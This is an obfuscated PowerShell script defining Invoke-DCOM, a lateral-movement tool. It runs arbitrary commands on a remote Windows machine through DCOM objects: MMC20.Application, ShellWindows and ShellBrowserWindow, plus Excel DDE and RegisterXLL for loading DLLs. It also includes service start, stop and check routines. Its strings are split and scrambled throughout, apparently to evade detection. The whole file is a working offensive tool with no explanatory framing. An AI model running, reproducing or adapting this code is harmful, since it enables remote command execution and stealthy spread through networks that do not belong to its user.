${s`yzV}  =[tYPE]("{1}{0}"-F'pE','ty')  ;  ${SJ`cu}  =  [tYPe]("{4}{2}{1}{0}{3}"-F'o','t','ysTeM.aCTIva','r','s');  

function INV`OkE-`dc`oM {


    [CmdletBinding()]
    Param (
        [Parameter(mANDATOrY = ${t`RUE}, pOsITIOn = 0, vAluEfrOmpiPELiNE = ${TR`Ue}, VaLUEfRoMPiPelInebYPROPertYname = ${TR`Ue})]
        [String]
        ${CoM`PUte`R`Name},

        [Parameter(ManDaToRY = ${TR`Ue}, POsITIOn = 1)]
        [ValidateSet({"{3}{1}{2}{0}" -f 'tion','p','plica','MMC20.A'}, {"{2}{1}{3}{0}" -f 'ndows','h','S','ellWi'},{"{0}{2}{4}{1}{3}"-f 'She','n','llB','dow','rowserWi'},{"{2}{0}{3}{1}"-f 'e','main','Ch','ckDo'},{"{0}{2}{3}{1}" -f 'Ser','k','vice','Chec'},{"{1}{0}{2}{3}"-f'n','Mi','im','izeAll'},{"{3}{1}{2}{0}"-f'p','e','rviceSto','S'},{"{1}{0}{2}"-f 'erv','S','iceStart'},
        {"{0}{2}{1}" -f'DetectO','e','ffic'},{"{3}{2}{1}{0}"-f'XLL','er','t','Regis'},{"{0}{1}" -f 'E','xcelDDE'})]
        [String]
        ${me`TH`OD} = ("{3}{1}{4}{0}{2}"-f'a','C20.','tion','MM','Applic'),

        [Parameter(mAnDAtORy = ${F`Al`se}, PosItion = 2)]
        [string]
        ${servI`C`E`NamE},

        [Parameter(MAndAToRY = ${fa`LSE}, PosiTION = 3)]
        [string]
        ${cO`MM`ANd}= ("{1}{0}{2}"-f'alc','c','.exe'),

        [Parameter(MAnDaToRY = ${FAL`Se}, PositiON = 4)]
        [string]
        ${d`LLPaTH}

    )

    Begin {

    
       if (${meT`h`od} -Match ("{0}{1}{2}"-f 'ShellWi','ndow','s')) {

            [String]${DC`om} = ("{0}{5}{3}{1}{6}{2}{7}{4}" -f '9BA0','CF-A4','0A0C9','11','A8F39','5972-F6A8-','42-0','0')
        }
        
        elseif (${mE`T`Hod} -Match ("{3}{0}{2}{1}"-f 'llBrowse','w','rWindo','She')) {

            [String]${D`COM} = ("{8}{10}{7}{3}{4}{9}{0}{5}{1}{6}{2}" -f '1-845','0','0C91F3880','A','1','5-','0A','-F2','C08AF','-11D','D90')
        }

        elseif (${mET`Hod} -Match ("{1}{2}{0}"-f 'main','CheckD','o')) {

            [String]${D`cOm} = ("{4}{2}{1}{0}{6}{5}{3}" -f '-84','90-F2A1-11D1','AFD','A0C91F3880','C08','5-00','5')
        }

        elseif (${M`ethOd} -Match ("{1}{2}{0}" -f'Check','Servic','e')) {

            [String]${D`COM} = ("{5}{3}{2}{6}{7}{9}{0}{10}{8}{4}{1}" -f '1-845','0','0-F2','9','A0C91F388','C08AFD','A','1-11','0','D','5-0')
        }

        elseif (${ME`THOD} -Match ("{1}{2}{0}{3}"-f'l','Minimiz','eA','l')) {

            [String]${DC`om} = ("{7}{1}{9}{0}{3}{6}{5}{8}{2}{4}" -f '1-11D','AFD','F388','1','0','00A0','-8455-','C08','C91','90-F2A')
        }

        elseif (${me`T`hOd} -Match ("{0}{2}{1}" -f'Service','p','Sto')) {

            [String]${d`cOm} = ("{3}{1}{2}{5}{6}{4}{0}"-f'880','A1-11D1-845','5-','C08AFD90-F2','3','00A0','C91F')
        }

        elseif (${m`ETHOD} -Match ("{2}{1}{0}{3}"-f 'vi','r','Se','ceStart')) {

            [String]${d`cOM} = ("{6}{8}{2}{0}{4}{7}{1}{3}{5}"-f'-','455-00','2A1','A0C91F38','1','80','C08AFD90','1D1-8','-F')
        }
    }
    
    
    Process {

        

        
        if (${mE`Thod} -Match ("{0}{1}{3}{2}{4}" -f'M','MC20.','pp','A','lication')) {

            ${c`om} =  ( VARIAblE  SyZv).vaLue::("{0}{2}{1}{4}{3}" -f'GetT','o','ypeFromPr','D','gI').Invoke(("{0}{1}{2}{3}"-f 'MMC20.','Appli','ca','tion'),"$ComputerName")
            ${o`BJ} =  (  ChiLdiTEM ("vAriaBl"+"e:s"+"jCU") ).vaLUE::("{0}{2}{3}{1}"-f 'C','e','reateIns','tanc').Invoke(${C`Om})
            ${O`BJ}."D`OCUm`ENt"."ACtI`V`EvI`ew".("{2}{3}{0}{1}"-f'uteShellComma','nd','Exe','c').Invoke(${COm`mAnd},${nu`LL},${nu`ll},"7")
        }
        elseif (${ME`TH`oD} -Match ("{1}{0}{2}{3}"-f'e','Sh','llW','indows')) {

            ${c`OM} =  (gEt-VARIabLe  ("Sy"+"zV")  -vAL)::("{3}{2}{1}{0}" -f'omCLSID','TypeFr','t','Ge').Invoke("$DCOM","$ComputerName")
            ${O`Bj} =   (cHIlditem VaRiAblE:SJCU).ValUe::("{0}{3}{2}{1}"-f 'CreateIns','e','c','tan').Invoke(${C`oM})
            ${i`Tem} = ${O`Bj}.("{1}{0}"-f'em','It').Invoke()
            ${i`TEm}."do`C`UMeNT"."APPl`Ic`ATIOn".("{3}{1}{0}{2}" -f't','lExecu','e','Shel').Invoke(("{0}{2}{1}" -f'cmd.e','e','x'),('/'+'c '+"$Command"),((("{1}{5}{2}{0}{4}{3}" -f 's{0}sys','c:{0}','ow','m32','te','wind'))-f  [chAr]92),${Nu`Ll},0)
        }

        elseif (${me`T`HOD} -Match ("{0}{1}{2}{3}{4}" -f'S','hellBrows','er','Win','dow')) {

            ${c`Om} =   (GcI VarIable:sYzV).vaLUe::("{3}{1}{2}{0}" -f 'CLSID','T','ypeFrom','Get').Invoke("$DCOM","$ComputerName")
            ${O`Bj} =  (gEt-iTem  ('VArIa'+'Bl'+'E:sjcu')).vALuE::("{3}{0}{2}{1}"-f 'ateIn','nce','sta','Cre').Invoke(${c`OM})
            ${O`Bj}."dOcu`meNT"."A`P`pLi`cATion".("{1}{0}{3}{2}"-f 'he','S','cute','llExe').Invoke(("{1}{2}{0}"-f'e','cmd','.ex'),('/c'+' '+"$Command"),((("{3}{2}{0}{1}" -f'windo','ws{0}system32','0}','c:{')) -f[ChaR]92),${N`Ull},0)
        }

        elseif (${Me`THOd} -Match ("{2}{1}{0}"-f 'ain','ckDom','Che')) {

            ${c`Om} =  (  GeT-vaRIABLE  syZV  -VALUe  )::("{3}{2}{4}{1}{0}"-f'ID','LS','m','GetTypeFro','C').Invoke("$DCOM","$ComputerName")
            ${O`BJ} =  (  VArIaBle ("SJc"+"u") -VaLueO )::("{1}{0}{2}" -f'eateInstan','Cr','ce').Invoke(${C`om})
            ${o`BJ}."docu`M`ENT"."APpLi`caT`IoN".("{0}{2}{1}{3}{4}{5}" -f 'GetSys','emIn','t','fo','rmatio','n').Invoke(("{2}{0}{1}{3}" -f'S_Dom','ainMem','IsO','ber'))
        }

        elseif (${M`Et`HOd} -Match ("{0}{2}{1}{3}" -f'S','ceCh','ervi','eck')) {

            ${C`oM} =  ( Get-VARiable ("SYZ"+"V")  -VAlue )::("{2}{4}{0}{3}{1}" -f'o','ID','G','mCLS','etTypeFr').Invoke(("{9}{10}{1}{7}{3}{2}{0}{4}{5}{8}{6}" -f'-84','0','1','-11D','5','5-00A0C91F3','80','-F2A1','8','C08A','FD9'),"$ComputerName")
            ${O`Bj} =   ( GeT-VAriable SJCU).VaLuE::("{2}{1}{3}{0}"-f 'ce','reateInsta','C','n').Invoke(${C`om})
            ${O`BJ}."DOC`U`MENt"."a`p`PlIcAtIoN".("{0}{1}{3}{2}" -f 'I','sSe','nning','rviceRu').Invoke("$ServiceName")
        }

        elseif (${M`et`HOd} -Match ("{1}{0}{2}"-f 'imi','Min','zeAll')) {

            ${C`Om} =   (  vARiAbLE  ("sYz"+"V")  -ValUeo )::("{2}{1}{0}{3}" -f 'eFro','Typ','Get','mCLSID').Invoke(("{6}{3}{4}{5}{7}{2}{8}{1}{0}"-f 'F3880','-00A0C91','D1-84','9','0-F2','A','C08AFD','1-11','55'),"$ComputerName")
            ${o`Bj} =   (  VarIabLE ("sjC"+"U")).vAlUE::("{3}{0}{2}{1}"-f 'eI','e','nstanc','Creat').Invoke(${c`om})
            ${O`Bj}."D`OCu`MENT"."a`p`PlIC`ATION".("{0}{1}{2}" -f 'Mini','mi','zeAll').Invoke()
        }

        elseif (${me`ThoD} -Match ("{3}{2}{0}{1}" -f't','op','ceS','Servi')) {

            ${c`om} =  (GeT-vAriaBLE  ('sYz'+'v')  ).VALue::("{3}{2}{0}{4}{1}"-f 'omCL','D','tTypeFr','Ge','SI').Invoke(("{8}{4}{6}{7}{2}{3}{0}{5}{1}"-f '91F','880','-8455-','00A0C','AFD','3','90-','F2A1-11D1','C08'),"$ComputerName")
            ${O`Bj} =  (  item ('vAR'+'IAbl'+'e:'+'sjcu')).valUE::("{1}{3}{0}{2}{4}"-f't','CreateIn','a','s','nce').Invoke(${c`om})
            ${O`Bj}."Do`cUm`ENT"."Ap`PLICaT`iON".("{2}{0}{3}{1}" -f'v','eStop','Ser','ic').Invoke("$ServiceName")
        }
        
        elseif (${Met`hOd} -Match ("{1}{3}{2}{0}"-f 'art','Service','t','S')) {

            ${C`oM} =  (  ls ('Var'+'IABLe:S'+'yzV') ).vaLUE::("{2}{0}{1}{4}{3}"-f 'yp','eFr','GetT','ID','omCLS').Invoke(("{0}{6}{5}{4}{7}{2}{8}{3}{1}" -f'C08','91F3880','D1','5-00A0C','1','D90-F2A1-','AF','1','-845'),"$ComputerName")
            ${o`BJ} =  ( variaBLe ("Sj"+"cU") -vaLue  )::("{1}{3}{0}{4}{2}" -f 'st','C','nce','reateIn','a').Invoke(${C`om})
            ${o`Bj}."d`oc`UMEnT"."appl`i`CaT`ION".("{1}{2}{3}{0}"-f'tart','Serv','ic','eS').Invoke("$ServiceName")
        }
        elseif (${mET`hod} -Match ("{0}{1}{2}" -f'Det','ectOffi','ce')) {

            ${C`OM} =   ${sY`Zv}::("{2}{1}{4}{0}{3}"-f'om','tTyp','Ge','ProgID','eFr').Invoke(("{0}{2}{1}{4}{3}" -f 'Ex','el.Applica','c','ion','t'),"$ComputerName")
            ${O`Bj} =   ${sJ`cu}::("{0}{3}{1}{2}" -f'C','n','ce','reateInsta').Invoke(${c`OM})
            ${I`s`X64} = [boolean]${O`BJ}."aPp`l`icAtIoN"."Pr`o`DU`CtcODE"[21]
            .("{2}{1}{0}"-f't','Hos','Write-')  $(If (${IS`X64}) {("{1}{5}{4}{3}{0}{2}"-f 't','Off','ed','detec',' ','ice x64')} Else {("{4}{2}{0}{1}{3}"-f' x86 d','etecte','ce','d','Offi')})
        }
        elseif (${m`E`ThOD} -Match ("{0}{1}{3}{2}"-f 'Reg','ist','XLL','er')) {

            ${C`Om} =   ${Sy`Zv}::("{3}{4}{1}{2}{0}"-f 'ogID','P','r','GetTyp','eFrom').Invoke(("{2}{1}{3}{5}{0}{4}" -f'licatio','el.','Exc','Ap','n','p'),"$ComputerName")
            ${o`BJ} =   ${Sj`CU}::("{2}{0}{3}{1}{4}"-f 'e','Instan','Cr','ate','ce').Invoke(${C`OM})
            ${o`BJ}."AP`plic`A`TiOn".("{0}{2}{1}" -f'Register','L','XL').Invoke("$DllPath")
        }
        elseif (${M`eTh`Od} -Match ("{1}{2}{0}" -f 'lDDE','E','xce')) {

            ${c`oM} =   (  ChILDItEm VaRiabLe:SYZv).VALue::("{4}{1}{0}{3}{2}"-f 'ype','T','ogID','FromPr','Get').Invoke(("{1}{0}{2}{3}{4}{5}"-f 'xcel','E','.Ap','plic','a','tion'),"$ComputerName")
            ${o`BJ} =  ${sj`cu}::("{2}{3}{0}{1}"-f'Instan','ce','Creat','e').Invoke(${C`oM})
            ${O`Bj}."diSp`LA`YalE`RTs" = ${Fal`Se}
            ${o`Bj}.("{0}{2}{1}"-f'DD','tiate','EIni').Invoke("cmd", ('/c'+' '+"$Command"))
        }
    }

    End {

        &("{1}{2}{0}{3}" -f'Ou','W','rite-','tput') ("{1}{0}{2}" -f 'mpl','Co','eted')
    }
    

}